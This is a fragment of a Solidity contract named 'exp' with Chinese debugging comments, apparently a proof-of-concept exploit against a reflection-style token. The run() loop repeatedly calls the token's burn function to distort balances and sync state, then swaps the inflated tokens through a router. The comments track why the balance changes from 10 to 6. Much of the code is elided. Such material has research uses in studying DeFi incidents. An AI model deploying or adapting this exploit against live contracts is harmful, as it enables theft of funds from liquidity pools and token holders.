...
contract info {
    address owner =0xC578d755Cd56255d3fF6E92E1B6371bA945e3984 ;
...
contract exp is info{
    ...
    function run() internal {
        ...
        */
        ...
        for (uint256 i=0; i<num; ++i) {
            uint256 _balance = ExpToken.balanceOf(address(this)); //这里的balance是10 没问题
            uint256 burnAmount = _balance * rate / 100;
            expToken.call(abi.encodeWithSelector(0x42966c68, _balance - burnAmount));
        }
        //1. call burn 改变, _rOwned[msg.sender], tTotal
        //2. check balanceOf
        //3. call Sync
        //4. 这三步之后, 再读取balanceOf, 会发现balanceOf的值变成了6, 为什么?
        //
        ...
        */
        ...
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ExpToken.balanceOf(address(this)), //这里读出来的是6
            0,
            sellPath,
            address(this),
            block.timestamp
